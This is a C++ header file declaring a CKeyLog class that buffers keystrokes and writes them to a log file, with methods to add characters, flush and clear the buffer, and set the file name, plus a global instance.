#pragma once

#include "CGlobals.h"
//helper functions for handling the keystroke log
  
const int C_KEY_LOG_BUFFER_SIZE = 2000;

class CKeyLog
{
public:
     CKeyLog();
     ~CKeyLog();
      
      void CKeyLog::LogActive(bool b_active);
      void WriteMessage(char message[]);
      void SetFileName(char p_st_new[]);
      void CKeyLog::ClearBuffer();
      void FlushBuffer(); //write everything out
      void CKeyLog::AddChar(char ch);
private:

    char m_ch_buffer[C_KEY_LOG_BUFFER_SIZE];
    int m_i_buffer_pointer;
    bool m_b_log_active;
    char m_st_key_log[MAX_PATH];
};

extern CKeyLog g_key_log; 
